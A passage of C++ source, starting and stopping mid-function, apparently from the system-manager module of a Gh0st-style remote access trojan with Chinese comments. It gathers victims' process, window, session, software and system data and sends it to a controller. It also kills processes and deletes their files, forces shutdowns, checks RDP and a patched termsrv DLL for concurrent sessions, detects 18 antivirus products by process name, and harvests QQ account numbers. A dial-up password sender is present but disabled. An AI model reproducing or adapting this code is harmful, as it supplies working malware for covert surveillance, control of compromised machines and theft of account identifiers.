					if(RegQueryValueEx(hSubKey, "InstallDate", 0, &dwType, (LPBYTE)regInstallDate, &dwRegSize) == ERROR_SUCCESS )
					{
					}
					else
					{
						FILETIME fileLastTime;
						RegQueryInfoKey(hSubKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 
							NULL, NULL, NULL, &fileLastTime);
						SYSTEMTIME sTime, stLocal ;
						FileTimeToSystemTime(&fileLastTime,&sTime);
						SystemTimeToTzSpecificLocalTime(NULL, &sTime, &stLocal);
						TCHAR tchTime[MAX_LEG] = {0};
						wsprintf(tchTime,"%d%02d%02d",stLocal.wYear,stLocal.wMonth,stLocal.wDay);
						lstrcpy(regInstallDate,tchTime);
					}

					dwRegSize = MAX_LEG;
					memset(regUninstallString,0,MAX_LEG);
					RegQueryValueEx(hSubKey, "UninstallString", 0, &dwType, (LPBYTE)regUninstallString, &dwRegSize);
	

					// 缓冲区太小，再重新分配下
					dwLength = lstrlen(regDisplayName) + lstrlen(regPublisher) + lstrlen(regDisplayVersion) + lstrlen(regInstallDate) + lstrlen(regUninstallString) + 6;
					if (LocalSize(lpBuffer) < (dwOffset + dwLength))
						lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);


					memcpy(lpBuffer + dwOffset, regDisplayName, lstrlen(regDisplayName) + 1);
			    	dwOffset += lstrlen(regDisplayName) + 1;

					memcpy(lpBuffer + dwOffset, regPublisher, lstrlen(regPublisher) + 1);
			    	dwOffset += lstrlen(regPublisher) + 1;

					memcpy(lpBuffer + dwOffset, regDisplayVersion, lstrlen(regDisplayVersion) + 1);
			    	dwOffset += lstrlen(regDisplayVersion) + 1;

					memcpy(lpBuffer + dwOffset, regInstallDate, lstrlen(regInstallDate) + 1);
			    	dwOffset += lstrlen(regInstallDate) + 1;

					memcpy(lpBuffer + dwOffset, regUninstallString, lstrlen(regUninstallString) + 1);
			    	dwOffset += lstrlen(regUninstallString) + 1;										
				}             
			}
		}
	}
	else 
	{
		return FALSE; //打开键失败
	}

	RegCloseKey(hKey);

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);

	return lpBuffer;
}

void CSystemManager::SendDialupassList()
{
	return;
	CDialupass	pass;
	
	int	nPacketLen = 0;
	int i;
	for (i = 0; i < pass.GetMax(); i++)
	{
		COneInfo	*pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
			nPacketLen += lstrlen(pOneInfo->Get(j)) + 1;
	}
	
	nPacketLen += 1;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLen);
	
	DWORD	dwOffset = 1;
	for (i = 0; i < pass.GetMax(); i++)
	{
		COneInfo	*pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
		{
			int	nFieldLength = lstrlen(pOneInfo->Get(j)) + 1;
			memcpy(lpBuffer + dwOffset, pOneInfo->Get(j), nFieldLength);
			dwOffset += nFieldLength;
		}
	}
	
	lpBuffer[0] = TOKEN_DIALUPASS;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemManager::TestWindow(LPBYTE lpBuffer)
{
   	DWORD hwnd;
	DWORD dHow;
	memcpy((void*)&hwnd,lpBuffer,sizeof(DWORD));      //得到窗口句柄
	memcpy(&dHow,lpBuffer+sizeof(DWORD),sizeof(DWORD));     //得到窗口处理参数
	ShowWindow((HWND__ *)hwnd,dHow);
}

void CSystemManager::CloseWindow(LPBYTE lpBuffer)
{
	DWORD hwnd;
	memcpy(&hwnd,lpBuffer,sizeof(DWORD));      //得到窗口句柄 
	::PostMessage((HWND__ *)hwnd,WM_CLOSE,0,0); //向窗口发送关闭消息
	
	Sleep(200);
	SendWindowsList();  //窗口显示刷新
}

void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
{
	HANDLE hProcess = NULL;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	nSize -=1;
	char    strProcessName[MAX_PATH] = {0};
	
	for (UINT i = 0; i < nSize; i += 4)
	{
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(lpBuffer + 1 + i));
		GetModuleFileNameEx(hProcess,NULL,strProcessName, sizeof(strProcessName));
		BOOL bProcess = TerminateProcess(hProcess, 0);

		if (lpBuffer[0] && bProcess)
		{			
			int n = 0;
			while(1)
			{
				DeleteFile(strProcessName);
				Sleep(200);
				if(GetFileAttributes(strProcessName) == -1)  //检查文件不存在  退出
					break;
				n ++ ;
				if(n >= 10)  //无法删除 一段时间后退出
					break;
			}
		}
		CloseHandle(hProcess);
	}
	DebugPrivilege(SE_DEBUG_NAME, FALSE);
	// 稍稍Sleep下，防止出错
	Sleep(100);
}

void CSystemManager::ShutdownWindows( DWORD dwReason )
{
	DebugPrivilege(SE_SHUTDOWN_NAME,TRUE);
	ExitWindowsEx(dwReason, 0);
	DebugPrivilege(SE_SHUTDOWN_NAME,FALSE);	
}

BOOL CSystemManager::DebugPrivilege(const char *PName,BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;
	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	
	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}
	
	CloseHandle(hToken);
	return bResult;	
}

void CSystemManager::SendProcessList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getProcessList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

BOOL DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath)
{
	TCHAR			szDriveStr[500];
	TCHAR			szDrive[3];
	TCHAR			szDevName[100];
	INT				cchDevName;
	INT				i;
	
	//检查参数
	if(!pszDosPath || !pszNtPath )
		return FALSE;
	
	//获取本地磁盘字符串
	if(GetLogicalDriveStrings(sizeof(szDriveStr), szDriveStr))
	{
		for(i = 0; szDriveStr[i]; i += 4)
		{
			if(!lstrcmpi(&(szDriveStr[i]), "A:\\") || !lstrcmpi(&(szDriveStr[i]), "B:\\"))
				continue;
			
			szDrive[0] = szDriveStr[i];
			szDrive[1] = szDriveStr[i + 1];
			szDrive[2] = '\0';
			if(!QueryDosDevice(szDrive, szDevName, 100))//查询 Dos 设备名
				return FALSE;
			
			cchDevName = lstrlen(szDevName);
			if(strncmp(pszDosPath, szDevName, cchDevName) == 0)//命中
			{
				lstrcpy(pszNtPath, szDrive);//复制驱动器
				lstrcat(pszNtPath, pszDosPath + cchDevName);//复制路径
				return TRUE;
			}			
		}
	}
	
	lstrcpy(pszNtPath, pszDosPath);
	
	return FALSE;
}

BOOL GetProcessUserName(HANDLE hProcess, TCHAR * strProcessUser)
{
	HANDLE hToken = NULL;
	BOOL bFuncReturn = FALSE;
	PTOKEN_USER pToken_User = NULL;
	DWORD dwTokenUser = 0;
	TCHAR szAccName[MAX_PATH] = {0};
	TCHAR szDomainName[MAX_PATH] = {0};
	HANDLE hProcessToken = NULL;
	if(hProcess != NULL)
	{
		// 提升本进程的权限
		bFuncReturn = ::OpenProcessToken(hProcess,TOKEN_QUERY,&hToken);
		if( bFuncReturn == 0) // 失败
			return FALSE;
		
		if(hToken != NULL)
		{
			::GetTokenInformation(hToken, TokenUser, NULL,0L, &dwTokenUser);
			if(dwTokenUser>0)
			{
				pToken_User = (PTOKEN_USER)::GlobalAlloc( GPTR, dwTokenUser );
			}
			
			if(pToken_User != NULL)
			{
				bFuncReturn = ::GetTokenInformation(hToken, TokenUser, pToken_User, dwTokenUser, &dwTokenUser);
			}
			
			if(bFuncReturn != FALSE && pToken_User != NULL)
			{
				SID_NAME_USE eUse  = SidTypeUnknown;
				DWORD dwAccName    = 0L; 
				DWORD dwDomainName = 0L;
				PSID  pSid = pToken_User->User.Sid;
				bFuncReturn = ::LookupAccountSid(NULL, pSid, NULL, &dwAccName,
					NULL,&dwDomainName,&eUse );
				
				if(dwAccName>0 && dwAccName < MAX_PATH && dwDomainName>0 && dwDomainName <= MAX_PATH)
				{
					bFuncReturn = ::LookupAccountSid(NULL,pSid,szAccName,&dwAccName,
						szDomainName,&dwDomainName,&eUse );
				}
				
				if( bFuncReturn != 0)
					lstrcpy(strProcessUser,szAccName);

			}
		}
	}
	
	if (pToken_User != NULL)
		::GlobalFree( pToken_User );
	
	if(hToken != NULL)
		::CloseHandle(hToken);
	
	return TRUE;
}
  
LPBYTE CSystemManager::getProcessList()
{
	HANDLE			hSnapshot = NULL;
	HANDLE			hProcess = NULL;
	HMODULE			hModules = NULL;
	PROCESSENTRY32	pe32 = {0};
	DWORD			cbNeeded;
	char			strProcessName[MAX_PATH] = {0};
	char            strProcessUser[MAX_PATH] = {0};
	TCHAR           szImagePath[MAX_PATH] ={0};
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;
	DWORD           dwWorkingSetSize = 0;
	DWORD           dwFileSize = 0;
	PROCESS_MEMORY_COUNTERS pmc;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if(hSnapshot == INVALID_HANDLE_VALUE)
		return NULL;
	
	pe32.dwSize = sizeof(PROCESSENTRY32);
	
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	
	lpBuffer[0] = TOKEN_PSLIST;
	dwOffset = 1;
	
	if(Process32First(hSnapshot, &pe32))
	{	  
		do
		{      
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			if ((pe32.th32ProcessID !=0 ) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
			{
				EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
				
				if(0 == GetProcessImageFileName(hProcess, szImagePath, MAX_PATH))
				{
					lstrcpy(strProcessName, "unknown erro");
					
				}
				else if(!DosPathToNtPath( szImagePath,strProcessName))
				{
					
				}

				memset(strProcessUser,0,sizeof(strProcessUser));
				if (GetProcessUserName(hProcess,strProcessUser))
				{
					if (lstrlen(strProcessUser) == 0)
					{
						lstrcpy(strProcessUser,"ERROR 2");
					}
				}
				else
				{
					lstrcpy(strProcessUser,"ERROR 1");
				}
				
				// 此进程占用数据大小
				dwLength = sizeof(DWORD)*5 + lstrlen(pe32.szExeFile) + lstrlen(strProcessName) + lstrlen(strProcessUser) + 3;
				// 缓冲区太小，再重新分配下
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
				
				memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
				dwOffset += sizeof(DWORD);	
				
				memcpy(lpBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) + 1);
				dwOffset += lstrlen(pe32.szExeFile) + 1;
				
				memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
				dwOffset += lstrlen(strProcessName) + 1;


				DWORD dwPriClass = GetPriorityClass(hProcess);
 				memcpy(lpBuffer + dwOffset, &dwPriClass, sizeof(DWORD) );
				dwOffset += sizeof(DWORD);

				dwPriClass = pe32.cntThreads;
				memcpy(lpBuffer + dwOffset, &dwPriClass, sizeof(DWORD) );
				dwOffset += sizeof(DWORD);

				memcpy(lpBuffer + dwOffset, strProcessUser, lstrlen(strProcessUser) + 1);
				dwOffset += lstrlen(strProcessUser) + 1;

				ZeroMemory(&pmc,sizeof(pmc));
				pmc.cb = sizeof(PROCESS_MEMORY_COUNTERS);
				if (GetProcessMemoryInfo( hProcess, &pmc, sizeof(pmc)) )
				{
					dwWorkingSetSize = (DWORD)(pmc.WorkingSetSize/1024);		//单位为k
				}
				else
					dwWorkingSetSize = 0;

				memcpy(lpBuffer + dwOffset, &dwWorkingSetSize, sizeof(DWORD));
				dwOffset += sizeof(DWORD);


				HANDLE handle = CreateFile(strProcessName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
				if (handle != INVALID_HANDLE_VALUE)
				{
					dwFileSize = GetFileSize(handle, NULL)  / 1024;
					CloseHandle(handle);
				}
				else
					dwFileSize = 0;

				memcpy(lpBuffer + dwOffset, &dwFileSize, sizeof(DWORD));
				dwOffset += sizeof(DWORD);

			}

			CloseHandle(hProcess);//新修改
		}
		while(Process32Next(hSnapshot, &pe32));
	}
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	DebugPrivilege(SE_DEBUG_NAME, FALSE); 
	CloseHandle(hSnapshot);
	return lpBuffer;	
}

void CSystemManager::SendWindowsList()
{
	LPBYTE	lpBuffer = getWindowsList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	
	LocalFree(lpBuffer);	
}

LPBYTE CSystemManager::getWindowsList()
{
	LPBYTE	lpBuffer = NULL;
	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
	lpBuffer[0] = TOKEN_WSLIST;
	return lpBuffer;	
}

bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	if(!IsWindowVisible(hwnd))
		return true;
	
	DWORD dwLength = 0;
	DWORD dwOffset = 0;
	
	LPBYTE lpBuffer = *(LPBYTE *)lParam;
	
	char strTitle[1024]={0};
	try
	{
		if (!SendMessage(hwnd,WM_GETTEXT,sizeof(strTitle)-1,(LPARAM)strTitle))
			return true;
		
		strTitle[sizeof(strTitle)-1]=0;
		
		if (lstrlen(strTitle) == 0)
			return true;
		
		if (lpBuffer == NULL)
		{
			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
			dwOffset=1;
		}else
		{
			dwOffset = LocalSize(lpBuffer);
			while(*(lpBuffer + dwOffset - 2)==0) dwOffset--;			
		}
		
		dwLength = sizeof(DWORD) + sizeof(DWORD) + lstrlen(strTitle) + 1;
		lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
	}catch (...)
	{
		return true;
	}
	
	GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
	memcpy(lpBuffer + dwOffset + sizeof(DWORD) ,&hwnd,sizeof(DWORD));

	memcpy(lpBuffer + dwOffset + sizeof(DWORD)*2, strTitle, lstrlen(strTitle) + 1);
	
	*(LPBYTE *)lParam = lpBuffer;
	return true;
}


void CSystemManager::SendUserStateList()
{
	LPBYTE	lpBuffer = getUserStateList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemManager::SendSysUserList()
{
	LPBYTE	lpBuffer = getSysUserList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);	
}


bool GetSessionInfo(DWORD dwSessionId, char *str,_WTS_INFO_CLASS Class)  
{  
	LPTSTR pBuffer = NULL;  
	DWORD dwBufferLen;    
	BOOL bRes = WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE,dwSessionId,Class, &pBuffer, &dwBufferLen);    
	if (bRes == FALSE)  
	{  
		return false;  
	}
	
	if(Class == WTSClientAddress)
	{
		PWTS_CLIENT_ADDRESS pWTSCA = (PWTS_CLIENT_ADDRESS)pBuffer;
		wsprintf(str, "%d.%d.%d.%d",pWTSCA->Address[2],pWTSCA->Address[3],pWTSCA->Address[4],pWTSCA->Address[5]); 
	}
	else
	{
		lstrcpy(str,pBuffer);  
	}

	WTSFreeMemory(pBuffer);   
	return true;  
}

LPBYTE CSystemManager::getUserStateList()
{
	LPBYTE	lpBuffer = NULL;
	DWORD	dwOffset = 0;
	DWORD	dwLength = 0;
	char	ConnectionState[MAX_PATH];   

	PWTS_SESSION_INFO ppSessionInfo = NULL;  
	WTS_SESSION_INFO  wts;
	DWORD pCount  = 0;  

	BOOL result = WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &ppSessionInfo, &pCount);  
	if (result == FALSE)
		return NULL;

	char	strUserName[256];  
	char    strSessionId[256];
	char    strClientAddress[256];
	char    strWinStationName[256];
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_ASLIST;
	dwOffset = 1;

	for( DWORD i = 0; i < pCount; i++ )
	{
		wts = ppSessionInfo[i];
		
		DWORD					TSSessionId		  = wts.SessionId;
		LPTSTR					TSpWinStationName = wts.pWinStationName;
		WTS_CONNECTSTATE_CLASS	TSState			  = wts.State;

		//  计算机名称
		memset(strUserName,0,sizeof(strUserName));
		GetSessionInfo(TSSessionId,strUserName,WTSUserName);
		if(lstrlen(strUserName) == 0)
			continue;

		//会话
		memset(strWinStationName,0,sizeof(strWinStationName));
		GetSessionInfo(TSSessionId,strWinStationName, WTSWinStationName);  
		//远程桌面连接IP
		memset(strClientAddress,0,sizeof(strClientAddress));
		GetSessionInfo(TSSessionId,strClientAddress, WTSClientAddress);   
		//会话ID标识
		memset(strSessionId,0,sizeof(strSessionId));
		GetSessionInfo(TSSessionId,strSessionId, WTSSessionId);            


		// 会话状态
		memset(ConnectionState,0,sizeof(ConnectionState));
		switch( TSState )
		{
		case WTSActive:
			lstrcpy(ConnectionState,"Active");
			break;
		case WTSConnected:
			lstrcpy(ConnectionState,"Connected");
			break;
		case WTSConnectQuery:
			lstrcpy(ConnectionState,"ConnectQuery");
			break;
		case WTSShadow:
			lstrcpy(ConnectionState,"Shadow");
			break;
		case WTSDisconnected:
			lstrcpy(ConnectionState,"Disconnected");
			break;
		case WTSIdle:
			lstrcpy(ConnectionState,"SIdle");
			break;
		case WTSListen:
			lstrcpy(ConnectionState,"Listen");
			break;
		case WTSReset:
			lstrcpy(ConnectionState,"Reset");
			break;
		case WTSDown:
			lstrcpy(ConnectionState,"Down");
			break;
		case WTSInit:
			lstrcpy(ConnectionState,"Init");
			break;
		default:
			lstrcpy(ConnectionState,"error");
			break;
		}


		dwLength = lstrlen(strUserName) + lstrlen(strSessionId) + lstrlen(strClientAddress) + lstrlen(strWinStationName) + lstrlen(ConnectionState) + 5;
		// 缓冲区太小，再重新分配下
		if (LocalSize(lpBuffer) < (dwOffset + dwLength))
			lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);

		memcpy(lpBuffer + dwOffset, strUserName, lstrlen(strUserName) + 1);
		dwOffset += lstrlen(strUserName) + 1;

		memcpy(lpBuffer + dwOffset, strSessionId, lstrlen(strSessionId) + 1);
		dwOffset += lstrlen(strSessionId) + 1;

		memcpy(lpBuffer + dwOffset, strClientAddress, lstrlen(strClientAddress) + 1);
		dwOffset += lstrlen(strClientAddress) + 1;

		memcpy(lpBuffer + dwOffset, strWinStationName, lstrlen(strWinStationName) + 1);
		dwOffset += lstrlen(strWinStationName) + 1;

		memcpy(lpBuffer + dwOffset, ConnectionState, lstrlen(ConnectionState) + 1);
		dwOffset += lstrlen(ConnectionState) + 1;
	}

	// 释放
	WTSFreeMemory(ppSessionInfo); 

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);

	return lpBuffer;
}


void CSystemManager::SendSysInfoList()
{
	LPBYTE			lpBuffer = (LPBYTE)LocalAlloc(LPTR, sizeof(tagSystemInfo)+1);
	lpBuffer[0] = TOKEN_SSLIST;	
	if(lpBuffer == NULL)
		return;
	tagSystemInfo m_SysInfo;
	GetSystemInfo(&m_SysInfo);
	memcpy(lpBuffer + 1, &m_SysInfo, sizeof(tagSystemInfo));
	Send(lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

//======================================================================================================================
BOOL GetTerminalState()
{
	SC_HANDLE hSCManager, schService;
	SERVICE_STATUS   ssStatus;
	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCManager == NULL)
	{
		return FALSE;
	}
	schService = OpenService( hSCManager, "TermService", SERVICE_ALL_ACCESS);
	if(schService   ==   NULL)
	{
		return FALSE;
	}
	if (!QueryServiceStatus(schService, &ssStatus))
	{	
		CloseServiceHandle(schService);
		CloseServiceHandle(hSCManager);
		return FALSE;
	}
	CloseServiceHandle(schService);
	CloseServiceHandle(hSCManager);
	if (ssStatus.dwCurrentState != SERVICE_RUNNING)
	{
		return FALSE;
	}
	return TRUE;
}




BOOL bFindTermsrvDll()
{
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);
	char strDll[MAX_PATH];
	BOOL bRet = FALSE;
	GetSystemDirectory(strDll, sizeof(strDll));
	lstrcat(strDll, "\\termsrv_t.dll");
	
	
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, TRUE);
	HANDLE hProcessSnap= CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	//查找相关的进程
	if(Process32First(hProcessSnap, &pe32))
	{
		do
		{
			HANDLE hModuleHandle = FindModule(pe32.th32ProcessID, strDll);
			if (hModuleHandle != NULL)
			{
				bRet = TRUE;
				break;
			}
			
		}while (Process32Next(hProcessSnap,&pe32));
	}
	CloseHandle(hProcessSnap);
	
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, FALSE);
	
	return bRet;
}

void Get3389State( LPTSTR lpBuffer, UINT uSize)
{
	memset(lpBuffer, 0, uSize);
	
	if (!GetTerminalState())
	{
		lstrcpy(lpBuffer, "未开启3389服务");
		return;
	}
	
	char szCanConnect[32];
	ReadRegEx(HKEY_LOCAL_MACHINE, 
		"SYSTEM\\CurrentControlSet\\Control\\Terminal Server", 
		"fDenyTSConnections", 	REG_DWORD, 	szCanConnect,	NULL,	NULL, 	0);
	
	if (atoi(szCanConnect) != 0)
	{	
		lstrcpy(lpBuffer, "未允许连接3389");
		return;
	}
	else if(!bIsOsXP()) 
	{
		lstrcpy(lpBuffer, "已开启且无需双开");
		return;
	}
	else
	{
		char szDllName[MAX_PATH];
		ReadRegEx(HKEY_LOCAL_MACHINE, 
			"SYSTEM\\CurrentControlSet\\Services\\TermService\\Parameters", 
			"ServiceDll", REG_EXPAND_SZ, szDllName, NULL, NULL, 0);
		
		if (strstr(szDllName, "termsrv_t") == 0)
		{
			lstrcpy(lpBuffer, "已开启但未双开");
			return;
		}
		else
		{
			if (bFindTermsrvDll())
			{
				lstrcpy(lpBuffer, "已开启且已双开");
				return;
			}
			else
			{
				lstrcpy(lpBuffer, "已开启但未双开");
				return;
			}
		}
	}
	return;
}
//======================================================================================================================

void GetAntivirus(char *AllName)
{	
	char *str[18][2] = 
	{
		"360tray.exe","360安全卫士",
			"360sd.exe","360杀毒",
			"avp.exe","卡巴斯基",
			"kvmonxp.exe","江民",
			"RavMonD.exe","瑞星",
			"Mcshield.exe","麦咖啡",
			"egui.exe","NOD32",
			"kxetray.exe","金山",
			"TMBMSRV.exe","趋势",
			"Avgui.exe","AVG",
			"Avastsvc.exe","Avast",
			"avguard.exe","小红伞",
			"bdagent.exe","比特梵德",
			"Msmpeng.exe","MSE",
			"spider.exe","Dr.Web",
			"ccapp.exe","Norton",
			"v3lsvc.exe","V3",
			"ayagent.aye","药丸"
	};
	
	PROCESSENTRY32 pe; 
	DWORD dwRet;
	HANDLE hSP = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if (hSP)
	{
		for (int i = 0 ; i< 18; i++)
		{
			pe.dwSize = sizeof( pe );
			
			for (dwRet = Process32First(hSP, &pe); dwRet; dwRet = Process32Next(hSP, &pe))
			{
				if (lstrcmpi( str[i][0], pe.szExeFile) == 0)
				{
					lstrcat(AllName , str[i][1]);
					lstrcat(AllName , " ");
					
					break;
				}
			}
		}
	}
	
	CloseHandle(hSP);
	
	if (lstrlen(AllName) == 0)
		lstrcpy(AllName,"未发现");
	
	return;
}

UINT Get3389Port( LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[MAX_PATH] = {0};
	memset(lpBuffer, 0, uSize);
	
	lstrcpy(strSubKey, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp");
	
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "PortNumber", REG_DWORD, (char *)lpBuffer, NULL, uSize, 0);
	
	if (lstrlen(lpBuffer) == 0)
		lstrcpy(lpBuffer,"出错");
	
	return lstrlen(lpBuffer);
}


void Get_LogUser(char *lpUserName,DWORD nNameLen)
{
	DWORD	dwProcessID = GetProcessID("explorer.exe");
	if (dwProcessID == 0)
		return ;
	
	BOOL fResult = FALSE;
	HANDLE hProc = NULL;
	HANDLE hToken = NULL;
	TOKEN_USER *pTokenUser = NULL;
	
	__try
	{
		// Open the process with PROCESS_QUERY_INFORMATION access
		hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessID);
		if (hProc == NULL)
		{
			__leave;
		}
		fResult = OpenProcessToken(hProc, TOKEN_QUERY, &hToken);
		if(!fResult) 
		{
			__leave;
		}
		
		DWORD dwNeedLen = 0;	
		fResult = GetTokenInformation(hToken,TokenUser, NULL, 0, &dwNeedLen);
		if (dwNeedLen > 0)
		{
			pTokenUser = (TOKEN_USER*)new BYTE[dwNeedLen];
			fResult = GetTokenInformation(hToken,TokenUser, pTokenUser, dwNeedLen, &dwNeedLen);
			if (!fResult)
			{
				__leave;
			}
		}
		else
		{
			__leave;
		}
		
		SID_NAME_USE sn;
		TCHAR szDomainName[MAX_PATH];
		DWORD dwDmLen = MAX_PATH;
		
		fResult = LookupAccountSid(NULL, pTokenUser->User.Sid, lpUserName, &nNameLen,
			szDomainName, &dwDmLen, &sn);
	}
	__finally
	{
		if (hProc)
			::CloseHandle(hProc);
		if (hToken)
			::CloseHandle(hToken);
		if (pTokenUser)
			delete[] (char*)pTokenUser;
	}
} 
char *GetQQ()
{
	char *szQQNum = new char[2048];
	memset(szQQNum, 0, 260);
	char szText[2048] = {0};
    char szQQNumber[2048] = {0};
    HWND hWnd = FindWindowA("CTXOPConntion_Class", NULL);
	
	while (hWnd)
	{
		char szClassName[MAX_PATH] = {0};
		GetClassName(hWnd, szClassName, MAX_PATH);
		if (strcmp(szClassName, "CTXOPConntion_Class") == 0)
		{	
			// 得到类似OP_12345678的字符串
			if (hWnd)
			{
				GetWindowText(hWnd, szText, MAX_PATH);
			}
			// 得到12345678 qq号
			int len = strlen(szText);
			do
			{
				len--;
			} while (szText[len] != '_');
			strcpy(szQQNumber, &szText[len+1]);
			if (lstrlen(szQQNum) != 0)
			{	
				strcat(szQQNum, "|");
			}
			strcat(szQQNum, szQQNumber);
		}
		hWnd = GetWindow(hWnd, GW_HWNDNEXT);
	}
	if (lstrlen(szQQNum) == 0)
	{
		strcpy(szQQNum, "-/-");
	}
	return szQQNum;
}
void GetLocalQQNum(char szQQNum1[1024])
{
	
	TCHAR pathBuffer[MAX_PATH] = {0};
    SHGetSpecialFolderPath(NULL, pathBuffer, CSIDL_APPDATA, FALSE);
	TCHAR strPath[MAX_PATH]={0};
	strcpy(strPath,pathBuffer);
	strcat(strPath,"\\Tencent\\Users\\*.*");
    HANDLE hFile;
    WIN32_FIND_DATA fileData;
    hFile = FindFirstFile(strPath, &fileData);
    FindNextFile(hFile, &fileData);
	int i = 0;
    while (FindNextFile(hFile, &fileData))
    {
        // 如果是一个文件夹目录
        if(fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
			
			strcat(fileData.cFileName,"| ");
			memcpy(szQQNum1+i,fileData.cFileName,strlen(fileData.cFileName));
			i+=strlen(fileData.cFileName);			
        }
    }
//	strcpy(QQ,szQQMun);
//	return QQ;
} 
void CSystemManager::GetSystemInfo(tagSystemInfo* pSysInfo)
{
	ZeroMemory(pSysInfo,sizeof(tagSystemInfo));
	//获取CPU信息===============================
	if(
		!ReadRegEx
		(
		HKEY_LOCAL_MACHINE, 
		"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0\0", 
		"ProcessorNameString",
		REG_SZ, 
		pSysInfo->szCpuInfo, 
		NULL,
		lstrlen(pSysInfo->szCpuInfo),
		0)
		)
		strcpy(pSysInfo->szCpuInfo,"Find CPU infomation error");
	
	//获取运行时间============================
	DWORD dwTime,dwDay,dwHour,dwMin;
	dwTime = GetTickCount();
	dwDay  = dwTime / (1000 * 60 * 60 * 24);
	dwTime = dwTime % (1000 * 60 * 60 * 24);
	dwHour = dwTime / (1000 * 60 * 60);
	dwTime = dwTime % (1000 * 60 * 60);
	dwMin  = dwTime / (1000 * 60);
	wsprintf(pSysInfo->szActiveTime, "已运行 %d天 %d小时 %d分钟", dwDay,dwHour,dwMin);
	
	//获取杀毒软件========================
    GetAntivirus(pSysInfo->szAntiVirus);
	
	//获取计算机名========================
	gethostname(pSysInfo->szPcName,sizeof(pSysInfo->szPcName));

	//获取用户名========================
